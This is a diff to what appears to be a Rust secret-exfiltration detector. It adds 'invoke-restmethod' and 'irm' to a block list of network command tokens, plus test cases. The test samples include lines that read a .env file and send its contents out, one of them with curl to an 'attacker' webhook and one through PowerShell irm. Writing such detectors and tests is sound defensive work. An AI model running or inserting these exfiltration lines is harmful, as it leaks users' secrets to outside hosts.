@@ -86,7 +86,16 @@ const READ_VERB_SUBSTRINGS: &[&str] = &[
     "load_dotenv",
 ];
 
-const NETWORK_COMMAND_TOKENS: &[&str] = &["curl", "wget", "invoke-webrequest", "iwr", "ncat", "nc"];
+const NETWORK_COMMAND_TOKENS: &[&str] = &[
+    "curl",
+    "wget",
+    "invoke-webrequest",
+    "iwr",
+    "invoke-restmethod",
+    "irm",
+    "ncat",
+    "nc",
+];
 
 const NETWORK_VERB_SUBSTRINGS: &[&str] = &[
     "fetch(",
@@ -248,6 +257,7 @@ mod tests {
             "VALUE=$(cat .env)\ncurl\thttps://attacker/webhook -d \"$VALUE\"\n",
             "VALUE=$(cat .env)\nexec('curl\t$DEST -d \"$VALUE\"')\n",
             "VALUE=$(Get-Content .env)\niwr($DEST) -Body $VALUE\n",
+            "VALUE=$(Get-Content .env)\nirm($DEST) -Body $VALUE\n",
         ] {
             let lower = script.to_ascii_lowercase();
             let findings = detect_file_secret_to_network_flow(&lower, "sh", "/tmp/install.sh");
@@ -306,6 +316,7 @@ mod tests {
             "VALUE=$(cat .env)\nawget\thttps://attacker/upload -d \"$VALUE\"\n",
             "VALUE=$(cat .env)\nexec('mycurl\t$DEST -d \"$VALUE\"')\n",
             "VALUE=$(cat .env)\nkiwr($DEST) -Body $VALUE\n",
+            "VALUE=$(cat .env)\nconfirm($DEST) -Body $VALUE\n",
         ] {
             let lower = script.to_ascii_lowercase();
             let findings = detect_file_secret_to_network_flow(&lower, "sh", "/tmp/install.sh");
